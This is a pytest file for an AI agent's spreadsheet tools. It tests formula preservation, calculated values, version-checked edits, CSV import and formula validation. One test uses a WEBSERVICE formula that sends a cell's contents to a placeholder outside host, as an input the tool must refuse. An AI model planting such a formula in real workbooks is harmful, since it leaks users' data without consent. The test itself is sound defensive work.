"""The agent's sheet tools: a workbook is written from a request with formulas that stay formulas,
read back as text with the values the formulas give, and changed through the editor's own writer;
no number is invented and a formula that reaches outside the file is refused."""

from __future__ import annotations

import io

import openpyxl
import pytest
from sqlalchemy.ext.asyncio import create_async_engine
from sqlmodel.ext.asyncio.session import AsyncSession
from test_report_table_roundtrip import _DDL

from app.core.config import settings
from app.models.workspace import ArtifactKind
from app.services import office_doc, sheet_calc, sheet_doc, sheet_edit
from app.services.tools import sheet as sheet_tools
from app.services.tools.base import ToolContext

USER, SESSION = "sheet-agent", "s-sheet"

SALES = {
    "title": "월별 매출",
    "sheets": [{
        "name": "매출",
        "rows": [["월", "매출", "비용", "이익"],
                 ["1월", "1,200", 300, "=B2-C2"],
                 ["2월", 1500, 400, "=B3-C3"],
                 ["합계", "=SUM(B2:B3)", "=SUM(C2:C3)", "=SUM(D2:D3)"]],
        "styles": [{"range": "B2:D4", "numFmt": "#,##0"}],
    }],
}


@pytest.fixture
async def local(tmp_path, monkeypatch):
    monkeypatch.setattr(settings, "file_storage_dir", str(tmp_path))
    engine = create_async_engine("sqlite+aiosqlite://")
    async with engine.begin() as connection:
        for statement in _DDL:
            await connection.exec_driver_sql(statement)

    def make():
        return AsyncSession(engine, expire_on_commit=False)

    monkeypatch.setattr(sheet_tools, "SessionLocal", make)
    try:
        yield make
    finally:
        await engine.dispose()


def _ctx(**kw) -> ToolContext:
    return ToolContext(user_id=USER, session_id=SESSION, **kw)


async def _written(local, ctx=None):
    ctx = ctx or _ctx()
    made = await sheet_tools.xlsx_write(SALES, ctx)
    assert not made.failed, made.content
    async with local() as db:
        artifact = await office_doc.owned(db, made.trace["artifactId"], user_id=USER,
                                          session_id=SESSION)
    return ctx, made, artifact


@pytest.mark.asyncio
async def test_a_workbook_is_written_with_formulas_that_stay_formulas(local):
    _, made, artifact = await _written(local)
    assert artifact.kind is ArtifactKind.xlsx and artifact.data["format"] == "xlsx"
    assert "수식이 낸 값" in made.content and "매출!D4 =SUM(D2:D3) → 2000" in made.content
    data = office_doc.read(artifact)
    formulas = openpyxl.load_workbook(io.BytesIO(data))["매출"]
    assert formulas["D2"].value == "=B2-C2" and formulas["B4"].value == "=SUM(B2:B3)"
    assert formulas["B2"].value == 1200 and formulas["B2"].number_format == "#,##0"
    cached = openpyxl.load_workbook(io.BytesIO(data), data_only=True)["매출"]
    assert cached["B4"].value == 2700 and cached["D4"].value == 2000


@pytest.mark.asyncio
async def test_the_workbook_is_read_as_text_with_values_and_edited_in_place(local):
    ctx, _, artifact = await _written(local)
    read = await sheet_tools.xlsx_read({}, ctx)
    assert "B4 =SUM(B2:B3) → 2700" in read.content and "A2=1월" in read.content
    only = await sheet_tools.xlsx_read({"range": "A4:B4"}, ctx)
    assert "A4=합계" in only.content and "A2=1월" not in only.content
    edited = await sheet_tools.xlsx_edit({"ops": [
        {"op": "set_cells", "sheet": "매출", "at": "B3", "values": [[2000]]},
        {"op": "insert_rows", "sheet": "매출", "at": 3},
        {"op": "set_cells", "sheet": "매출", "at": "A3", "values": [["1.5월", 100, 50, "=B3-C3"]]},
    ]}, ctx)
    assert not edited.failed, edited.content
    async with local() as db:
        now = await office_doc.owned(db, artifact.id, user_id=USER, session_id=SESSION)
    assert now.version == 2
    book = openpyxl.load_workbook(io.BytesIO(office_doc.read(now)))["매출"]
    # the total's range followed the inserted row, and it is still a formula
    assert book["B5"].value == "=SUM(B2:B4)" and book["A5"].value == "합계"
    cached = openpyxl.load_workbook(io.BytesIO(office_doc.read(now)), data_only=True)["매출"]
    assert cached["B5"].value == 3300


@pytest.mark.asyncio
async def test_an_edit_needs_the_current_read_and_a_manual_save_moves_it(local):
    ctx, _, artifact = await _written(local, _ctx())
    fresh = _ctx(open_artifact={"id": artifact.id, "version": 1})
    refused = await sheet_tools.xlsx_edit(
        {"ops": [{"op": "set_cells", "at": "A9", "values": [["x"]]}]}, fresh)
    assert refused.failed and "xlsx_read" in refused.content
    async with local() as db:
        row = await office_doc.owned(db, artifact.id, user_id=USER, session_id=SESSION)
        await sheet_doc.save(db, row, sheet_edit.apply(
            office_doc.read(row), [{"op": "set_cells", "at": "A9", "values": [["손으로"]]}]).data,
            expected=1, summary="편집기에서 저장")
    stale = await sheet_tools.xlsx_edit(
        {"ops": [{"op": "set_cells", "at": "B9", "values": [[1]]}]}, ctx)
    assert stale.failed and "xlsx_read" in stale.content


@pytest.mark.asyncio
async def test_a_formula_that_reaches_outside_the_file_is_refused_and_nothing_is_saved(local):
    ctx, _, artifact = await _written(local)
    await sheet_tools.xlsx_read({}, ctx)
    bad = await sheet_tools.xlsx_edit({"ops": [
        {"op": "set_cells", "at": "A9", "values": [["안전"]]},
        {"op": "set_cells", "at": "B9", "values": [['=WEBSERVICE("http://x.test/"&A2)']]},
    ]}, ctx)
    assert bad.failed and "쓸 수 없습니다" in bad.content
    async with local() as db:
        row = await office_doc.owned(db, artifact.id, user_id=USER, session_id=SESSION)
    assert row.version == 1


def test_numbers_written_as_people_write_them_are_numbers_and_codes_stay_text():
    assert sheet_edit.typed("1,200") == (1200, "#,##0")
    assert sheet_edit.typed("12.5%") == (0.125, "0.0%")
    assert sheet_edit.typed("2026-10-13")[1] == "yyyy-mm-dd"
    assert sheet_edit.typed("001234") == ("001234", None) and sheet_edit.typed("2026")[0] == "2026"
    assert sheet_edit.typed("[매출액]") == ("[매출액]", None)


def test_the_blanks_the_agent_left_are_listed_instead_of_invented_numbers():
    data = sheet_doc.blank()
    done = sheet_edit.apply(
        data, [{"op": "set_cells", "at": "A1", "values": [["매출", "[매출액]"]]}])
    assert sheet_edit.blanks(done.data) == ["시트1!B1 [매출액]"]


def test_structure_edits_move_the_references_of_formulas_on_other_sheets():
    data = sheet_edit.apply(sheet_doc.blank(), [
        {"op": "set_cells", "at": "A1", "values": [[1], [2], [3]]},
        {"op": "add_sheet", "name": "요약 시트"},
        {"op": "set_cells", "sheet": "요약 시트", "at": "A1", "values": [["=SUM(시트1!A1:A3)",
                                                                         "=시트1!A3"]]},
    ]).data
    moved = sheet_edit.apply(data, [{"op": "delete_rows", "sheet": "시트1", "at": 2}])
    book = openpyxl.load_workbook(io.BytesIO(moved.data))["요약 시트"]
    assert book["A1"].value == "=SUM(시트1!A1:A2)" and book["B1"].value == "=시트1!A2"
    gone = sheet_edit.apply(moved.data, [{"op": "delete_rows", "sheet": "시트1", "at": 2}])
    assert openpyxl.load_workbook(io.BytesIO(gone.data))["요약 시트"]["B1"].value == "=#REF!"


def test_the_calculator_does_what_is_exact_and_leaves_the_rest_alone():
    book = openpyxl.Workbook()
    ws = book.active
    ws.title = "A"
    ws.append([10, 4, "=A1/B1", "=IF(A1>5,\"큼\",\"작음\")", "=ROUND(A1/3,1)", "=A1/0"])
    ws.append(["=TODAY()", "=VLOOKUP(1,A1:B1,2)", "=SUMIF(A1:B1,\">5\")"])
    buffer = io.BytesIO()
    book.save(buffer)
    got = sheet_calc.values(buffer.getvalue())
    assert got[("A", 1, 3)] == 2.5 and got[("A", 1, 4)] == "큼" and got[("A", 1, 5)] == 3.3
    assert got[("A", 1, 6)] == "#DIV/0!" and got[("A", 2, 3)] == 10.0
    # a function it does not do keeps no invented value
    assert ("A", 2, 1) not in got and ("A", 2, 2) not in got


@pytest.mark.asyncio
async def test_a_sheet_made_from_an_attached_csv_copies_it_as_written(local, monkeypatch):
    from app.models.workspace import StoredFile
    from app.services import files

    csv = "지점,3분기,비고\n강남,1200,\n서초,\"1,500\",확인 필요\n".encode("cp949")
    async with local() as db:
        from sqlalchemy import JSON, MetaData
        from sqlalchemy.dialects.postgresql import JSONB
        from sqlmodel import SQLModel

        metadata = MetaData()
        for source in SQLModel.metadata.sorted_tables:
            for column in source.to_metadata(metadata).columns:
                if isinstance(column.type, JSONB):
                    column.type, column.server_default = JSON(), None
        connection = await db.connection()
        await connection.run_sync(metadata.create_all, tables=[metadata.tables["files"]])
        row = StoredFile(user_id=USER, session_id=SESSION, name="지점실적.csv", size=len(csv),
                         mime="text/csv", storage_key="k/지점실적.csv", text="", tokens=0)
        db.add(row)
        await db.commit()
    real = files.read_blob
    monkeypatch.setattr(
        files, "read_blob", lambda key: csv if key == "k/지점실적.csv" else real(key))
    made = await sheet_tools.xlsx_write({"title": "지점 실적", "sheets": [{
        "name": "원본", "from_file": {"file": "지점실적.csv"},
        "chart": {"type": "bar", "x": "지점", "y": ["3분기"], "title": "지점별"}}]}, _ctx())
    assert not made.failed, made.content
    assert "3행 × 3열을 있는 그대로" in made.content
    async with local() as db:
        artifact = await office_doc.owned(db, made.trace["artifactId"], user_id=USER,
                                          session_id=SESSION)
    raw = office_doc.read(artifact)
    sheet = openpyxl.load_workbook(io.BytesIO(raw))["원본"]
    assert sheet["A2"].value == "강남" and sheet["B3"].value == 1500 and sheet["C2"].value is None
    # a native chart rides in the file, and the sheet panel keeps it as it keeps every chart
    import zipfile

    assert any(n.startswith("xl/charts/chart") for n in zipfile.ZipFile(io.BytesIO(raw)).namelist())
    missing = await sheet_tools.xlsx_write(
        {"title": "x", "sheets": [{"name": "a", "from_file": {"file": "없는.csv"}}]}, _ctx())
    assert missing.failed and "찾지 못했습니다" in missing.content


def test_a_text_that_only_starts_with_an_equal_sign_is_not_written_as_a_formula():
    blank = sheet_doc.blank()
    for bad in ("=== 구분 ===", "=SUM(B2:B3", "=B2+", "=*3"):
        with pytest.raises(sheet_edit.SheetError):
            sheet_edit.apply(blank, [{"op": "set_cells", "at": "A1", "values": [[bad]]}])
    good = ["=IF(A2>1,\"예\",\"아니오\")", "=-A2", "=A2%"]
    sheet_edit.apply(blank, [{"op": "set_cells", "at": "A1", "values": [good]}])
